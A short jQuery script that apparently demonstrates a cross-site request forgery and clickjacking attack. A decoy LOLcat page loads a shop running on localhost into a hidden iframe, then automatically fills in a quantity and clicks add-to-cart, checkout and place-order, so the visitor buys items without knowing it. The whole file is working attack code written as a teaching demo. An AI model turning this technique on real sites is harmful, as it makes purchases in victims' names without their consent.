 $(document).ready(function () {
    if (showAttack = window.location.search.indexOf("?ShowAttack=true") == 0) {
        $("#csrfAttackFrame").fadeTo('fast', 1.0);
    }
    else {
        $("#csrfAttackFrame").fadeTo('fast', 0.0);
    }

    //Grab a random LOLCat image
    var lolCatUrl = ["images/lolcatz/", Math.ceil(Math.random() * 23).toString(), ".jpg"].join("");
    $('#lolcatImage').attr("src", lolCatUrl);
    $('#lolcatImage').attr("alt", "LolCat images r ausum!");
    AddProductToCart(); //Start the attack

    function AddProductToCart() {
        //console.log("Ahm loadin' ur cart wiff mah goodies.");
        $('#csrfAttackFrame').attr('src', 'http://localhost:7777/Product.aspx?ID=29');
        $('#csrfAttackFrame').load(function () { ClickAddToCartButton(); });
    }

    function ClickAddToCartButton() {
        $('#csrfAttackFrame').load(function () { ClickCheckoutButton(); });
        //console.log("Ahm puttin' lotz of mah goodies in ur cart.");
        $('#csrfAttackFrame').contents().find('#MainContent_txtQuantity').val('10');
        //console.log("Ahm clickin' teh button.");
        $('#csrfAttackFrame').contents().find('#MainContent_btnAddToCart').click();
    }

    function ClickCheckoutButton() {
        $('#csrfAttackFrame').load(function () { ClickPlaceOrderButton(); });
        //console.log("Ahm checkin' out ur cart.");
        $('#csrfAttackFrame').contents().find('#MainContent_btnCheckOut').click();
    }

    function ClickPlaceOrderButton() {
        $('#csrfAttackFrame').load(function () { console.log("Thanx. U bot all mah stuffs!"); });
        //console.log("Ahm placin' ur final order.");
        $('#csrfAttackFrame').contents().find('#MainContent_btnPlaceOrder').click();
    }
});